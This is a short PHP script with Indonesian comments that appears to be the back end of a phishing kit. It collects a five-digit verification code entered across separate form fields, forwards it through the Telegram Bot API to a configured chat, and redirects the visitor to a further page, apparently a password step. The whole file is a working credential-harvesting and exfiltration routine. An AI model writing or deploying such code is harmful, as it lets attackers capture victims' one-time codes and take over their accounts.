<?php
// code.php

// Memuat konfigurasi
$config = require __DIR__ . '/../../config.php';

// Mengambil token dan chat ID dari konfigurasi
$botToken = $config['bot_token'];
$chatId = $config['chat_id'];

// Memeriksa apakah request method adalah POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Mengambil data pin dari form
    $pin1 = $_POST['pin1'];
    $pin2 = $_POST['pin2'];
    $pin3 = $_POST['pin3'];
    $pin4 = $_POST['pin4'];
    $pin5 = $_POST['pin5'];
    
    // Menggabungkan pin
    $pin = $pin1 . $pin2 . $pin3 . $pin4 . $pin5;
    
    // Membuat pesan
    $message = "Kode verifikasi: $pin";
    
    // URL API Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    
    // Data yang akan dikirim ke API
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];
    
    // Mengirim data ke API Telegram
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
        ]
    ];
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    // Mengarahkan pengguna ke halaman lain setelah sukses
    header('Location: ../../pas/index.php');
    exit();
}
?>
